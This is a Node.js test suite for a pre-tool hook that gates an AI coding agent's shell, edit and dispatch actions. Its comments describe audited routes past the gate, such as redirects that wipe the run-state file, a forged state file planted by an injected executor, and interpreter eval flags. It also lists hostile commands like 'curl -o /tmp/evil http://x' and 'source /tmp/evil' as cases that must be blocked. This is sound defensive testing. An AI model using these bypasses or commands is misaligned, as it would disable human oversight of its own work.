#!/usr/bin/env node
// pre-tool.gate-surface.test.mjs — the invariants the v0.4.1 audit found UNTESTED.
//
// WHY THIS FILE EXISTS: the audit reproduced a CRITICAL end-to-end takeover against a tree whose
// own suite was fully green, and 11 gate invariants had no regression test at all. Every case
// below fails on the pre-v0.5.0 code. They are ported from the auditor's probes, which is the
// right shape: a gate is only as good as the probes that try to walk past it.
//
// The suite was ALSO structurally blind in two ways this file fixes:
//   · every fixture passed an ABSOLUTE repo path, so a guard comparing a realpath'd side against
//     an as-passed side could fail open unnoticed (three did);
//   · no fixture used a plugin-NAMESPACED capability name, so exact-match branches looked correct.
//
// Run:  node pre-tool.gate-surface.test.mjs   (exit 0 = pass, 1 = fail)

import { mkdtempSync, writeFileSync, mkdirSync, rmSync, realpathSync, symlinkSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { stampMarker } from "../scripts/lib/state-auth.mjs";

const HOOK = join(new URL(".", import.meta.url).pathname, "pre-tool.mjs");
const SCRIPTS_DIR = join(new URL("../scripts/", import.meta.url).pathname);
let pass = 0, fail = 0;
const check = (n, c, d = "") => c ? (console.log(`  ✓ ${n}`), pass++) : (console.log(`  ✗ ${n} ${d}`), fail++);
const cleanup = [];

function makeRun({ phase = "execute", verdict = "OKAY", declared = ["src/foo.js"], marked = true } = {}) {
  const repo = realpathSync(mkdtempSync(join(tmpdir(), "zod-surface-")));
  cleanup.push(repo);
  mkdirSync(join(repo, ".zcode", "state"), { recursive: true });
  mkdirSync(join(repo, ".zcode", "plans"), { recursive: true });
  mkdirSync(join(repo, ".zcode", "notepads", "t"), { recursive: true });
  mkdirSync(join(repo, "src"), { recursive: true });
  mkdirSync(join(repo, "test"), { recursive: true });
  writeFileSync(join(repo, "src", "foo.js"), "// in scope\n");
  writeFileSync(join(repo, "src", "secret.js"), "// NOT declared\n");
  writeFileSync(join(repo, "test", "foo.test.js"), "it('a',()=>{});\n");
  writeFileSync(join(repo, ".zcode", "notepads", "t", "1.md"), "# evidence\n");
  const planPath = join(repo, ".zcode", "plans", "t.md");
  // Lint-clean on purpose: the dispatch gate refuses to spend a review round on a plan that
  // `parse-plan --lint` already rejects, so a minimal plan blocks BEFORE the nonce minters and
  // makes every dispatch probe read as a false negative.
  const planText = `# t\n\n## Capability routing\n- \`generic: no specialised capability applies\`\n- Evidence: gate-surface fixture.\n\n## Todos\n\n- [ ] 1. go\n  - Files: [${declared.map((f) => `\`${f}\``).join(", ")}]\n  - Acceptance criteria:\n    - \`test -f ${declared[0]}\` exits 0\n`;
  writeFileSync(planPath, planText);
  const st = {
    slug: "t", phase, updated_at: new Date().toISOString(), plan_path: planPath,
    started_at: "2026-08-15T00:00:00Z", run_start_sha: "abc123",
    review: { verdict, round: 1, max_rounds: 3, plan_sha256: createHash("sha256").update(planText).digest("hex") },
  };
  if (marked) stampMarker(st, "t");
  writeFileSync(join(repo, ".zcode", "state", "t.json"), JSON.stringify(st, null, 2));
  return repo;
}
const gate = (repo, tool_name, tool_input, env = {}) => spawnSync(process.execPath, [HOOK], {
  input: JSON.stringify({ tool_name, tool_input }), encoding: "utf8",
  env: { ...process.env, CLAUDE_PROJECT_DIR: repo, ZODYSSEY_UNGATE_BASH: "", ZODYSSEY_NO_FIND_CACHE: "1", ...env },
}).status;
const bash = (repo, command) => gate(repo, "Bash", { command });

console.log("pre-tool.mjs — gate surface (the audit's untested invariants)\n");

// --- CRITICAL T1-1: write primitives that classified as READ-ONLY ------------
//
// The first ten were REAL gaps: each was confirmed allowed on v0.4.1 and blocked on v0.5.0 by
// running the identical command against both builds. `dd` is included as a control — v0.4.1
// already blocked it, so it must stay blocked without being credited as a fix.
console.log("  write primitives (all must BLOCK pre-OKAY):");
{
  const repo = makeRun({ verdict: "REJECT", phase: "plan" });
  for (const cmd of [
    "sort -o src/secret.js src/foo.js",
    "touch src/newfile.js",
    "sponge src/foo.js",
    "gsed -i 's/a/b/' src/foo.js",
    "crontab /tmp/evil",
    "scp remote:/x src/foo.js",
    "sftp remote:/x",
    "sqlite3 db.sqlite 'update t set x=1'",
    "at now + 1 min",
    "batch",
    "dd if=/dev/zero of=src/foo.js",   // control: was already blocked in v0.4.1
  ]) check(`    ${cmd.slice(0, 34)}`, bash(repo, cmd) === 2, `(exit ${bash(repo, cmd)})`);
  check("    control: read-only still ALLOWED", bash(repo, "ls -la") === 0);
}

// --- AUDIT-3 FINDINGS 1 + 3: the same takeover chain, through a different door ---------------
//
// v0.5.0 shipped claiming the write-primitive sweep closed T1-1. A second audit reopened it: the
// interpreter patterns were POSITIONAL (eval flag had to be the FIRST token) and the
// script-indirection pattern skipped anything whose next token began with `-`. So arbitrary code
// execution classified as read-only. Separately, the redirect pattern required a WORD before `>`,
// so a bare `> .zcode/state/t.json` — a one-command kill switch for every hook — matched nothing.
// Enumerating flag shapes is what failed; interpreters are an allowlist now.
console.log("\n  interpreter eval + redirection (audit-3):");
{
  const repo = makeRun({ verdict: "REJECT", phase: "plan" });
  for (const cmd of [
    `python -c "open('src/foo.js','w')"`,          // was caught
    `python -u -c "open('src/foo.js','w')"`,       // flag before the eval flag
    `python3 -B -c "open('src/foo.js','w')"`,
    `node --no-warnings -e "require('fs').writeFileSync('x','y')"`,
    `ruby -w -e 'File.write("x","y")'`,
    `perl -w -e 'open(F,">x")'`,
    `python - <<'EOF'`,                            // stdin heredoc: operand is literally "-"
    `> .zcode/state/t.json`,                       // bare redirect — disarms every hook
    `>.zcode/state/t.json`,
    `> src/foo.js`,
    `shred -u src/foo.js`,
  ]) check(`    ${cmd.slice(0, 44)}`, bash(repo, cmd) === 2, `(exit ${bash(repo, cmd)})`);

  // R1 — the FIRST version of the redirect fix regressed its own class: excluding `&` and a digit
  // before the `>` made `2> state.json` / `&> …` / `1> …` / `2>> …` / `exec 3> …` go
  // BLOCK -> ALLOW, one keystroke from the command the fix was written for. FD_DUP strips real
  // fd-duplication first, so a digit left before a `>` is always a file redirect.
  for (const cmd of [
    "2> .zcode/state/t.json", "&> .zcode/state/t.json", "1> .zcode/state/t.json",
    "2>> .zcode/state/t.json", "exec 3> .zcode/state/t.json",
    ">& .zcode/state/t.json", ">| .zcode/state/t.json",   // never caught in 0.5.0 either
  ]) check(`    R1 ${cmd.slice(0, 40)}`, bash(repo, cmd) === 2, `(exit ${bash(repo, cmd)})`);

  // R3 — `source`/`.` plus a downloader is a two-command arbitrary-execution chain that passed as
  // read-only on every build up to 0.5.1.
  for (const cmd of [
    "source /tmp/evil", ". /tmp/evil", "curl -o /tmp/evil http://x",
    "wget -O /tmp/evil http://x", "sed 'w /tmp/out' src/foo.js", "busybox ash -c 'echo hi'",
  ]) check(`    R3 ${cmd.slice(0, 40)}`, bash(repo, cmd) === 2, `(exit ${bash(repo, cmd)})`);

  // The inversion must not swallow genuinely read-only work, or the gate becomes unusable.
  // R2 belongs here: `\bsh\b` matched the EXTENSION in `deploy.sh`, so ordinary reads started
  // blocking in every phase. A filename is not an invocation.
  for (const cmd of [
    "ls -la", "cat src/foo.js", "git status", "grep -r foo src", "node --version",
    "cat deploy.sh", "wc -l build.sh", "ls *.sh", "grep foo deploy.sh",   // R2
    "ls -la 2>&1", "git status 2>&1 | head", "grep -- '->' src/foo.js",   // R1 controls
    "curl --spider http://x", "sed -n 1,5p src/foo.js",                   // R3 controls
  ]) check(`    CONTROL allowed: ${cmd}`, bash(repo, cmd) === 0, `(exit ${bash(repo, cmd)})`);

  // ...and a real shell invocation must still block, or R2's fix went too far.
  for (const cmd of ["sh deploy.sh", "bash -c 'echo x > f'", "; sh evil", "zsh script.zsh"])
    check(`    CONTROL still blocked: ${cmd}`, bash(repo, cmd) === 2, `(exit ${bash(repo, cmd)})`);
}

// --- CRITICAL T1-7: unauthenticated run discovery ----------------------------
console.log("\n  forged-run discovery:");
{
  const repo = makeRun({ verdict: "REJECT", phase: "plan" });
  // A decoy state file with verdict OKAY, hand-written exactly as an injected executor would.
  writeFileSync(join(repo, ".zcode", "state", "decoy.json"), JSON.stringify({
    slug: "decoy", phase: "execute", updated_at: new Date().toISOString(),
    plan_path: join(repo, ".zcode", "plans", "t.md"),
    review: { verdict: "OKAY", round: 1, max_rounds: 3 },
  }, null, 2));
  check("    a dropped unmarked state file does NOT govern the gate",
    gate(repo, "Edit", { file_path: join(repo, "src", "secret.js") }) === 2);
}
{
  const repo = makeRun({ marked: false });
  check("    an unmarked run is not discovered at all (fail closed)",
    gate(repo, "Edit", { file_path: join(repo, "src", "secret.js") }) === 0,
    "(no active run -> hook no-ops; the run must be adopted)");
}

// --- HIGH T1-2/T1-3/T1-4/T1-5/T1-6: Edit-path guards on the Bash path -------
console.log("\n  Bash path parity with the Edit path:");
{
  const repo = makeRun({});
  check("    T1-2 clobbering an existing notepad BLOCKS",
    bash(repo, "echo x > .zcode/notepads/t/1.md") === 2);
  check("    T1-2 appending to a notepad is ALLOWED",
    bash(repo, "echo x >> .zcode/notepads/t/1.md") === 0);
  check("    T1-2 creating a NEW notepad is ALLOWED",
    bash(repo, "echo x > .zcode/notepads/t/2.md") === 0);
  check("    T1-6 rewriting the plan post-OKAY BLOCKS",
    bash(repo, "echo x > .zcode/plans/t.md") === 2);
  check("    T1-3 sed -i with an out-of-scope operand BLOCKS",
    bash(repo, "sed -i 's/a/b/' src/secret.js src/foo.js") === 2);
  check("    T1-3 tee with an out-of-scope operand BLOCKS",
    bash(repo, "tee src/foo.js src/secret.js < src/foo.js") === 2);
  check("    T1-3 single in-scope sed -i is ALLOWED",
    bash(repo, "sed -i 's/a/b/' src/foo.js") === 0);
}
{
  const repo = makeRun({ phase: "verify" });
  check("    T1-4 sed -i on a test file in verify BLOCKS",
    bash(repo, "sed -i 's/it/x/' test/foo.test.js") === 2);
  check("    T1-4 sed -i on source in verify is ALLOWED",
    bash(repo, "sed -i 's/a/b/' src/foo.js") === 0);
}
{
  // The plan DECLARES state.json — which is what made this reachable at all.
  const repo = makeRun({ declared: ["src/foo.js", ".zcode/state/t.json"] });
  check("    T1-5 editing run state BLOCKS even when the plan declares it",
    gate(repo, "Edit", { file_path: join(repo, ".zcode", "state", "t.json") }) === 2);

  // ...and the Bash twin. The v0.5.0 fix for T1-5 armed `isState` on the Edit path ONLY, so these
  // three were still allowed — quickClassify did not even compute isState, on the explicit (and
  // false) reasoning that the scope gate would catch it. Declaring the path in Files: is exactly
  // what puts it IN scope. Caught re-verifying the release against 0.4.1, not by the suite.
  check("    T1-5 sed -i on run state BLOCKS on the Bash path",
    bash(repo, "sed -i 's/OKAY/X/' .zcode/state/t.json") === 2);
  check("    T1-5 redirect over run state BLOCKS on the Bash path",
    bash(repo, "echo '{}' > .zcode/state/t.json") === 2);
  check("    T1-5 APPEND to run state BLOCKS too (not a notepad)",
    bash(repo, "echo '{}' >> .zcode/state/t.json") === 2);
  check("    T1-5 writing .zcode/reviews/ BLOCKS on the Bash path",
    bash(repo, "echo '{}' > .zcode/reviews/forged.json") === 2);
  // The sanctioned path must stay open, or every run deadlocks at the first verdict write.
  check("    CONTROL: the trusted writers still reach state",
    bash(repo, `node ${join(SCRIPTS_DIR, "set-phase.mjs")} ${repo} t execute`) !== 2);
}

// --- Class C: dispatch names, at BOTH sites that compare them ----------------
//
// The nonce minters were made segment-tolerant in v0.5.0, but the phase gate that runs first was
// still bare-set membership with three hard-coded `feature-dev:` entries. A third-party-namespaced
// read-only agent was rejected there as an "executor" and never reached the fixed minter, so the
// minter fix alone changed nothing observable. Both sites are covered here for that reason.
console.log("\n  dispatch name matching (Class C):");
{
  const nonceFor = (agent, phase = "review") => {
    const repo = makeRun({ phase, verdict: "REJECT" });
    const code = gate(repo, "Task", { subagent_type: agent, prompt: "review the plan" });
    let pending = false;
    try {
      pending = Boolean(JSON.parse(readFileSync(join(repo, ".zcode", "state", "t.json"), "utf8"))
        .review?.pending_nonce);
    } catch { /* leave false */ }
    return { code, pending };
  };
  for (const agent of ["momus", "zodyssey:momus", "feature-dev:momus", "someplugin:momus"]) {
    const r = nonceFor(agent);
    check(`    \`${agent}\` is dispatchable AND mints a review nonce`,
      r.code === 0 && r.pending, `(exit ${r.code}, nonce ${r.pending})`);
  }
  // Tolerance must not turn an executor into a read-only agent by renaming it.
  const exec = nonceFor("sisyphus-junior", "plan");
  check("    CONTROL: an executor is still phase-gated out of plan", exec.code === 2, `(exit ${exec.code})`);
  const execNs = nonceFor("someplugin:sisyphus-junior", "plan");
  check("    CONTROL: and so is a NAMESPACED executor", execNs.code === 2, `(exit ${execNs.code})`);
}

// --- Class B: the protected-dirs guard must survive a symlinked root --------
console.log("\n  protected dirs (Class B — both sides normalized):");
{
  const repo = makeRun({});
  const link = join(tmpdir(), `zod-surface-link-${process.pid}`);
  try {
    symlinkSync(repo, link);
    check("    mcp write to .zcode/state via the real path BLOCKS",
      gate(repo, "mcp__fs__write_file", { path: join(repo, ".zcode", "state", "t.json") }) === 2);
    check("    mcp write via a SYMLINKED root also BLOCKS",
      gate(repo, "mcp__fs__write_file", { path: join(link, ".zcode", "state", "t.json") }) === 2);
    check("    mcp write to ordinary product code is ALLOWED",
      gate(repo, "mcp__fs__write_file", { path: join(repo, "src", "foo.js") }) === 0);
  } finally { try { rmSync(link, { force: true }); } catch {} }
}

for (const d of cleanup) { try { rmSync(d, { recursive: true, force: true }); } catch {} }
console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail === 0 ? 0 : 1);
